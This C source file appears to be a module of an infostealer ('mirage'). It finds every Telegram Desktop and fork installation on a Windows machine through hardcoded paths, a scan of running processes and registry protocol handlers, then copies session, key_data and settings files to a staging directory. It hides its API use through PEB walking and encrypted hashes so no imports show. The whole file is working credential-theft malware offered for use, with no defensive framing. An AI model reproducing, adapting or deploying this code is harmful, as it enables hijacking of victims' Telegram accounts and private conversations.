/*
 * telegram_tdata.c — Telegram tdata session collection.
 *
 * Discovers all Telegram Desktop installations (stock + forks) via
 * three strategies, then copies qualifying session files.
 *
 * All Win32 APIs resolved via PEB-walk (mirage_get_module_by_hash /
 * mirage_get_function_by_hash) — no IAT imports.
 *
 * Guarded by #ifdef ENABLE_TELEGRAM.
 */

#include "telegram_tdata.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "hashes.h"
#include "nt_types.h"
#include "file_utils.h"

#ifdef ENABLE_TELEGRAM
#ifdef _WIN32

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ════════════════════════════════════════════════════════════════ *
 *  Constants                                                      *
 * ════════════════════════════════════════════════════════════════ */

#define TDATA_MAX_PATHS     32
#define TDATA_MAX_FILES     4096
#define TDATA_PATH_LEN      1024
#define TDATA_SESSION_LIMIT 7120  /* Max bytes for session data files */
#define TDATA_NAME_LEN      128

/* Skip-list entries (case-insensitive) */
static const char *skip_names[] = {
    "tdummy", "versions", "dumps", NULL
};

/* File prefixes to always collect (case-insensitive) */
static const char *collect_prefixes[] = {
    "usertag", "settings", "key_data", "configs", "maps", NULL
};

/* ════════════════════════════════════════════════════════════════ *
 *  API function pointer types                                     *
 * ════════════════════════════════════════════════════════════════ */

typedef DWORD  (WINAPI *fnGetEnvA)(const char *, char *, DWORD);
typedef HANDLE (WINAPI *fnFindFirstFileA)(const char *, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *fnFindNextFileA)(HANDLE, WIN32_FIND_DATAA *);
typedef BOOL   (WINAPI *fnFindClose)(HANDLE);
typedef DWORD  (WINAPI *fnGetFileAttributesA)(const char *);
typedef BOOL   (WINAPI *fnCreateDirectoryA)(const char *, void *);
typedef BOOL   (WINAPI *fnCopyFileA)(const char *, const char *, BOOL);
typedef NTSTATUS (*fnNtGetNextProcess)(HANDLE, ULONG, ULONG, ULONG, HANDLE *);
typedef NTSTATUS (*fnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, ULONG *);
typedef NTSTATUS (*fnNtClose)(HANDLE);
typedef NTSTATUS (*fnNtOpenKey)(HANDLE *, ULONG, PVOID);
typedef NTSTATUS (*fnNtQueryValueKey)(HANDLE, PVOID, ULONG, PVOID, ULONG, ULONG *);

/* ════════════════════════════════════════════════════════════════ *
 *  Resolved API pointers (lazy-initialized once)                  *
 * ════════════════════════════════════════════════════════════════ */

static struct {
    fnGetEnvA               pGetEnvA;
    fnFindFirstFileA        pFF;
    fnFindNextFileA         pFN;
    fnFindClose             pFC;
    fnGetFileAttributesA    pGFA;
    fnCreateDirectoryA      pMKDir;
    fnCopyFileA             pCopy;
    fnNtGetNextProcess      pGetNextProc;
    fnNtQueryInformationProcess pQIP;
    fnNtClose               pNtClose;
    fnNtOpenKey             pOpenKey;
    fnNtQueryValueKey       pQueryVal;
    int                     ready;
} g_api;

static void *resolve_fn(void *mod, const char *name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

static int ensure_api(void) {
    if (g_api.ready) return 1;

    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
    if (!k32) return 0;

    g_api.pGetEnvA  = (fnGetEnvA)              resolve_fn(k32, "GetEnvironmentVariableA");
    g_api.pFF       = (fnFindFirstFileA)       resolve_fn(k32, "FindFirstFileA");
    g_api.pFN       = (fnFindNextFileA)        resolve_fn(k32, "FindNextFileA");
    g_api.pFC       = (fnFindClose)            resolve_fn(k32, "FindClose");
    g_api.pGFA      = (fnGetFileAttributesA)   resolve_fn(k32, "GetFileAttributesA");
    g_api.pMKDir    = (fnCreateDirectoryA)     resolve_fn(k32, "CreateDirectoryA");
    g_api.pCopy     = (fnCopyFileA)            resolve_fn(k32, "CopyFileA");

    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
    if (!ntdll) return 0;

    g_api.pGetNextProc = (fnNtGetNextProcess)resolve_fn(ntdll, "NtGetNextProcess");
    g_api.pQIP         = (fnNtQueryInformationProcess)resolve_fn(ntdll, "NtQueryInformationProcess");
    g_api.pNtClose     = (fnNtClose)resolve_fn(ntdll, "NtClose");
    g_api.pOpenKey     = (fnNtOpenKey)resolve_fn(ntdll, "NtOpenKey");
    g_api.pQueryVal    = (fnNtQueryValueKey)resolve_fn(ntdll, "NtQueryValueKey");

    if (!g_api.pGetEnvA || !g_api.pFF || !g_api.pFN || !g_api.pFC ||
        !g_api.pGFA || !g_api.pMKDir || !g_api.pCopy || !g_api.pGetNextProc || !g_api.pQIP ||
        !g_api.pNtClose || !g_api.pOpenKey || !g_api.pQueryVal)
        return 0;

    g_api.ready = 1;
    return 1;
}

/* ════════════════════════════════════════════════════════════════ *
 *  String helpers                                                 *
 * ════════════════════════════════════════════════════════════════ */

static int strieq(const char *a, const char *b) {
    while (*a && *b) {
        char ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

static int starts_with_ci(const char *str, const char *prefix) {
    while (*prefix) {
        char cs = *str, cp = *prefix;
        if (cs >= 'A' && cs <= 'Z') cs += 32;
        if (cp >= 'A' && cp <= 'Z') cp += 32;
        if (cs != cp) return 0;
        str++; prefix++;
    }
    return 1;
}

static int is_in_skip_list(const char *name) {
    for (int i = 0; skip_names[i]; i++)
        if (strieq(name, skip_names[i])) return 1;
    return 0;
}

static int has_collect_prefix(const char *name) {
    for (int i = 0; collect_prefixes[i]; i++)
        if (starts_with_ci(name, collect_prefixes[i])) return 1;
    return 0;
}

/* Case-insensitive duplicate check for tdata paths. */
static int path_already_seen(const char **seen, size_t count, const char *path) {
    for (size_t i = 0; i < count; i++)
        if (strieq(seen[i], path)) return 1;
    return 0;
}

static void wchar_to_char(const WCHAR *src, size_t src_len,
                           char *dst, size_t dst_max) {
    size_t n = src_len < dst_max - 1 ? src_len : dst_max - 1;
    for (size_t i = 0; i < n; i++)
        dst[i] = (char)(unsigned char)src[i];
    dst[n] = 0;
}

/* ════════════════════════════════════════════════════════════════ *
 *  Discovery Strategy 1: Hardcoded default paths                  *
 * ════════════════════════════════════════════════════════════════ */

static const char *default_tdata_relpaths[] = {
    "Telegram Desktop\\tdata",
    /* Forks: paths under %APPDATA% */
    "AyuGram\\tdata",
    "Nekogram\\tdata",
    "Kotatogram\\tdata",
    "Unigram\\tdata",
    "64Gram\\tdata",
    "Telegram Messenger\\tdata",
    "Telegram Desktop Preview\\tdata",
    "Nicegram\\tdata",
    "exteraGram\\tdata",
    "iMe Messenger\\tdata",
    "TurboTel\\tdata",
    "64Gram\\tdata",
    NULL
};

static size_t discover_hardcoded(const char *appdata,
                                  char paths[][TDATA_PATH_LEN],
                                  size_t max_paths) {
    size_t count = 0;
    for (int i = 0; default_tdata_relpaths[i] && count < max_paths; i++) {
        char full[TDATA_PATH_LEN];
        snprintf(full, sizeof(full), "%s\\%s", appdata, default_tdata_relpaths[i]);

        /* Check if directory exists (probe for any file inside) */
        char probe[TDATA_PATH_LEN];
        snprintf(probe, sizeof(probe), "%s\\*", full);

        WIN32_FIND_DATAA fd;
        HANDLE h = g_api.pFF(probe, &fd);
        if (h != INVALID_HANDLE_VALUE) {
            g_api.pFC(h);
            if (!path_already_seen((const char **)paths, count, full)) {
                strncpy(paths[count], full, TDATA_PATH_LEN - 1);
                paths[count][TDATA_PATH_LEN - 1] = 0;
                count++;
            }
        }
    }
    return count;
}

/* ════════════════════════════════════════════════════════════════ *
 *  Discovery Strategy 2: Process scan                             *
 *  NtGetNextProcess loop — find running Telegram instances and    *
 *  derive <exe_dir>\tdata from the exe path.                      *
 * ════════════════════════════════════════════════════════════════ */

#define ProcessImageFileName 27
#define DESIRED_ACCESS       0x0401  /* PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE */

/* Case-insensitive: does wide filename (stem only) contain "telegram"? */
static int wname_contains_telegram(const WCHAR *wname, int wlen) {
    if (wlen < 8) return 0;  /* "telegram" = 8 chars minimum */
    for (int i = 0; i <= wlen - 8; i++) {
        int match = 1;
        for (int j = 0; j < 8; j++) {
            WCHAR wc = wname[i + j];
            if (wc >= L'A' && wc <= L'Z') wc += 32;
            if (wc != (WCHAR)("telegram"[j])) { match = 0; break; }
        }
        if (match) return 1;
    }
    return 0;
}

static size_t discover_processes(char paths[][TDATA_PATH_LEN],
                                  size_t max_paths, size_t start) {
    size_t count = start;
    HANDLE h = NULL;

    for (;;) {
        HANDLE next = NULL;
        NTSTATUS st = g_api.pGetNextProc(h, DESIRED_ACCESS, 0, 0, &next);
        if (h) g_api.pNtClose(h);
        if (st == STATUS_NO_MORE_ENTRIES) break;
        if (st < 0) { h = NULL; break; }
        h = next;

        /* Query image name */
        UNICODE_STRING img = {0, 0, NULL};
        st = g_api.pQIP(h, ProcessImageFileName, &img, sizeof(UNICODE_STRING), NULL);
        if (st < 0 || !img.Buffer || img.Length == 0) continue;

        /* Extract filename after last backslash */
        const WCHAR *name = img.Buffer;
        int nlen = img.Length / (int)sizeof(WCHAR);
        {
            int last_slash = -1;
            for (int i = 0; i < nlen; i++)
                if (img.Buffer[i] == L'\\') last_slash = i;
            if (last_slash >= 0) {
                name  = img.Buffer + last_slash + 1;
                nlen -= last_slash + 1;
            }
        }
        if (nlen <= 0) continue;

        /* Check if exe name contains "telegram" */
        if (!wname_contains_telegram(name, nlen)) continue;

        /* Extract exe directory (everything before the filename) */
        int dir_end = -1;
        for (int i = 0; i < img.Length / (int)sizeof(WCHAR); i++)
            if (img.Buffer[i] == L'\\') dir_end = i;
        if (dir_end < 0) continue;

        char exe_dir[TDATA_PATH_LEN];
        wchar_to_char(img.Buffer, dir_end, exe_dir, sizeof(exe_dir));

        /* Build tdata path: <exe_dir>\tdata */
        char tdata_path[TDATA_PATH_LEN];
        snprintf(tdata_path, sizeof(tdata_path), "%s\\tdata", exe_dir);

        /* Probe existence */
        if (g_api.pGFA(tdata_path) != INVALID_FILE_ATTRIBUTES &&
            !path_already_seen((const char **)paths, count, tdata_path)) {
            if (count < max_paths) {
                strncpy(paths[count], tdata_path, TDATA_PATH_LEN - 1);
                paths[count][TDATA_PATH_LEN - 1] = 0;
                count++;
            }
        }
    }
    if (h) g_api.pNtClose(h);
    return count;
}

/* ════════════════════════════════════════════════════════════════ *
 *  Discovery Strategy 3: Registry scan                            *
 *  HKCR\tg\shell\open\command and HKCR\tdesktop.tg\...\command   *
 * ════════════════════════════════════════════════════════════════ */

static void init_unicode_string(const char *s, size_t len,
                                 UNICODE_STRING *us, WCHAR *buf) {
    memset(buf, 0, 512 * sizeof(WCHAR));
    for (size_t i = 0; i < len; i++)
        buf[i] = (WCHAR)(unsigned char)s[i];
    us->Length        = (USHORT)(len * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
    us->Buffer        = buf;
}

/* Read the default value of a registry key. Returns narrow string length. */
static int reg_read_default(HANDLE parent_key, const char *subkey_name,
                             char *out, size_t out_max) {
    size_t sklen = strlen(subkey_name);
    WCHAR sk_buf[256];
    UNICODE_STRING sk_us;
    init_unicode_string(subkey_name, sklen, &sk_us, sk_buf);

    OBJECT_ATTRIBUTES oa;
    memset(&oa, 0, sizeof(oa));
    oa.Length        = sizeof(OBJECT_ATTRIBUTES);
    oa.RootDirectory = parent_key;
    oa.ObjectName    = &sk_us;
    oa.Attributes    = OBJ_CASE_INSENSITIVE;

    HANDLE sub = NULL;
    if (g_api.pOpenKey(&sub, KEY_READ, &oa) < 0 || !sub)
        return -1;

    /* Read default value (empty name) */
    WCHAR val_name_buf = 0;
    UNICODE_STRING val_name;
    val_name.Length        = 0;
    val_name.MaximumLength = sizeof(WCHAR);
    val_name.Buffer        = &val_name_buf;

    uint8_t val_buf[2048];
    ULONG val_len = 0;
    NTSTATUS qs = g_api.pQueryVal(sub, &val_name, KeyValuePartialInformation,
                                   val_buf, sizeof(val_buf), &val_len);
    g_api.pNtClose(sub);

    if (qs < 0) return -1;

    PKEY_VALUE_PARTIAL_INFORMATION kvpi =
        (PKEY_VALUE_PARTIAL_INFORMATION)val_buf;
    if (kvpi->Type != 1 /* REG_SZ */ || kvpi->DataLength < 4)
        return -1;

    wchar_to_char((const WCHAR *)kvpi->Data,
                  kvpi->DataLength / sizeof(WCHAR) - 1, out, out_max);
    return (int)strlen(out);
}

/* Extract exe path from a registry command string like:
 *   "C:\Users\...\Telegram.exe" "%1"
 *   C:\Users\...\Telegram.exe --workdir ...                        */
static int extract_exe_path(const char *cmd, char *out, size_t out_max) {
    const char *p = cmd;
    /* Skip leading whitespace */
    while (*p == ' ' || *p == '\t') p++;

    if (*p == '"') {
        /* Quoted path */
        p++;
        size_t i = 0;
        while (p[i] && p[i] != '"' && i + 1 < out_max) {
            out[i] = p[i];
            i++;
        }
        out[i] = 0;
        return (int)i;
    }

    /* Unquoted path — end at first space */
    size_t i = 0;
    while (p[i] && p[i] != ' ' && p[i] != '\t' && i + 1 < out_max) {
        out[i] = p[i];
        i++;
    }
    out[i] = 0;
    return (int)i;
}

static size_t discover_registry(char paths[][TDATA_PATH_LEN],
                                 size_t max_paths, size_t start) {
    size_t count = start;

    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
    if (!ntdll) return count;

    /* Open HKCR root */
    static const char hkcr_path[] = "\\Registry\\Machine\\SOFTWARE\\Classes";
    WCHAR hkcr_buf[512];
    UNICODE_STRING hkcr_us;
    init_unicode_string(hkcr_path, strlen(hkcr_path), &hkcr_us, hkcr_buf);

    OBJECT_ATTRIBUTES hkcr_oa;
    memset(&hkcr_oa, 0, sizeof(hkcr_oa));
    hkcr_oa.Length     = sizeof(OBJECT_ATTRIBUTES);
    hkcr_oa.ObjectName = &hkcr_us;
    hkcr_oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE hkcr = NULL;
    if (g_api.pOpenKey(&hkcr, KEY_READ, &hkcr_oa) < 0 || !hkcr)
        return count;

    /* Registry protocol keys to probe */
    static const char *proto_keys[] = {
        "tg",            /* telegram: protocol */
        "tdesktop.tg",   /* Telegram Desktop .tg file handler */
        NULL
    };

    for (int pi = 0; proto_keys[pi]; pi++) {
        /* Open <proto>\shell\open\command */
        char cmd_path[256];
        snprintf(cmd_path, sizeof(cmd_path), "%s\\shell\\open\\command", proto_keys[pi]);

        char cmd[1024];
        if (reg_read_default(hkcr, cmd_path, cmd, sizeof(cmd)) <= 0)
            continue;

        /* Extract exe path from command string */
        char exe_path[TDATA_PATH_LEN];
        if (extract_exe_path(cmd, exe_path, sizeof(exe_path)) <= 0)
            continue;

        /* Derive tdata: <exe_dir>\tdata */
        char *last_slash = strrchr(exe_path, '\\');
        if (!last_slash) last_slash = strrchr(exe_path, '/');
        if (!last_slash) continue;
        *last_slash = 0;

        char tdata_path[TDATA_PATH_LEN];
        snprintf(tdata_path, sizeof(tdata_path), "%s\\tdata", exe_path);

        if (g_api.pGFA(tdata_path) != INVALID_FILE_ATTRIBUTES &&
            !path_already_seen((const char **)paths, count, tdata_path)) {
            if (count < max_paths) {
                strncpy(paths[count], tdata_path, TDATA_PATH_LEN - 1);
                paths[count][TDATA_PATH_LEN - 1] = 0;
                count++;
            }
        }
    }

    g_api.pNtClose(hkcr);
    return count;
}

/* ════════════════════════════════════════════════════════════════ *
 *  Collection: copy qualifying files from a tdata directory       *
 *                                                                  *
 *  Rules:                                                         *
 *  - Files <=7120 bytes: always copy (session data)               *
 *  - Files matching prefixes (usertag, settings, key_data,        *
 *    configs, maps): always copy                                  *
 *  - 16-char-named subdirectories: copy recursively               *
 *  - Skip entries: tdummy, versions, dumps                        *
 * ════════════════════════════════════════════════════════════════ */

/* Create directory tree (mkdir -p equivalent). */
static void ensure_dir(const char *path) {
    g_api.pMKDir(path, NULL);
}

static void copy_tree(const char *src_dir, const char *dst_dir,
                       int *file_count) {
    char src_search[TDATA_PATH_LEN];
    snprintf(src_search, sizeof(src_search), "%s\\*", src_dir);

    WIN32_FIND_DATAA fd;
    HANDLE h = g_api.pFF(src_search, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        const char *name = fd.cFileName;

        /* Skip . and .. */
        if (name[0] == '.') {
            if (name[1] == 0) continue;
            if (name[1] == '.' && name[2] == 0) continue;
        }

        /* Skip blacklisted names */
        if (is_in_skip_list(name)) continue;

        char src_full[TDATA_PATH_LEN];
        char dst_full[TDATA_PATH_LEN];
        snprintf(src_full, sizeof(src_full), "%s\\%s", src_dir, name);
        snprintf(dst_full, sizeof(dst_full), "%s\\%s", dst_dir, name);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            /* Only recurse into 16-char-named subdirectories.
             * 16-char names are hex session/map identifiers. */
            size_t nlen = strlen(name);
            if (nlen == 16) {
                ensure_dir(dst_full);
                copy_tree(src_full, dst_full, file_count);
            }
        } else {
            /* File: check size or prefix */
            ULONGLONG fsize = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            int should_copy = 0;

            if (fsize <= TDATA_SESSION_LIMIT) {
                should_copy = 1;  /* Small file = session data */
            }
            if (has_collect_prefix(name)) {
                should_copy = 1;  /* Key/config file — always collect */
            }

            if (should_copy) {
                if (g_api.pCopy(src_full, dst_full, TRUE))
                    (*file_count)++;
            }
        }
    } while (g_api.pFN(h, &fd));

    g_api.pFC(h);
}

/* ════════════════════════════════════════════════════════════════ *
 *  Public entry point                                             *
 * ════════════════════════════════════════════════════════════════ */

int collect_telegram_tdata(const char *output_dir) {
    if (!output_dir) return -1;
    if (!ensure_api()) return -1;

    /* ── Collect all tdata paths from three strategies ─────────── */
    char tdata_paths[TDATA_MAX_PATHS][TDATA_PATH_LEN];
    size_t path_count = 0;

    /* Strategy 1: Hardcoded paths under %APPDATA% */
    {
        char appdata[TDATA_PATH_LEN];
        if (g_api.pGetEnvA("APPDATA", appdata, sizeof(appdata)) > 0) {
            path_count = discover_hardcoded(appdata, tdata_paths, TDATA_MAX_PATHS);
            dbg_printf("  [telegram] hardcoded: %zu paths\n", path_count);
        }
    }

    /* Strategy 2: Running process scan */
    path_count = discover_processes(tdata_paths, TDATA_MAX_PATHS, path_count);
    dbg_printf("  [telegram] +process: %zu paths\n", path_count);

    /* Strategy 3: Registry protocol handlers */
    path_count = discover_registry(tdata_paths, TDATA_MAX_PATHS, path_count);
    dbg_printf("  [telegram] +registry: %zu paths\n", path_count);

    if (path_count == 0) return 0;  /* No Telegram found — not an error */

    /* ── Create output directory ───────────────────────────────── */
    char tg_out[TDATA_PATH_LEN];
    snprintf(tg_out, sizeof(tg_out), "%s\\Telegram_tdata", output_dir);
    ensure_dir(tg_out);

    /* ── Copy qualifying files from each discovered tdata ──────── */
    int total_files = 0;
    for (size_t i = 0; i < path_count; i++) {
        char dest[TDATA_PATH_LEN];

        /* Create per-installation subdirectory to avoid collisions */
        const char *label = strrchr(tdata_paths[i], '\\');
        label = label ? label + 1 : "tdata";

        /* Use parent dir name for uniqueness */
        char parent[TDATA_PATH_LEN];
        strncpy(parent, tdata_paths[i], sizeof(parent) - 1);
        parent[sizeof(parent) - 1] = 0;
        char *ps = strrchr(parent, '\\');
        if (ps) {
            *ps = 0;
            const char *parent_name = strrchr(parent, '\\');
            parent_name = parent_name ? parent_name + 1 : parent;
            snprintf(dest, sizeof(dest), "%s\\%s_%s", tg_out, parent_name, label);
        } else {
            snprintf(dest, sizeof(dest), "%s\\%s_%zu", tg_out, label, i);
        }
        ensure_dir(dest);

        int before = total_files;
        copy_tree(tdata_paths[i], dest, &total_files);
        dbg_printf("  [telegram] %s -> %d files\n", tdata_paths[i], total_files - before);
    }

    dbg_printf("  [telegram] total: %d files from %zu installations\n",
               total_files, path_count);
    return 0;
}

#endif /* _WIN32 */
#endif /* ENABLE_TELEGRAM */
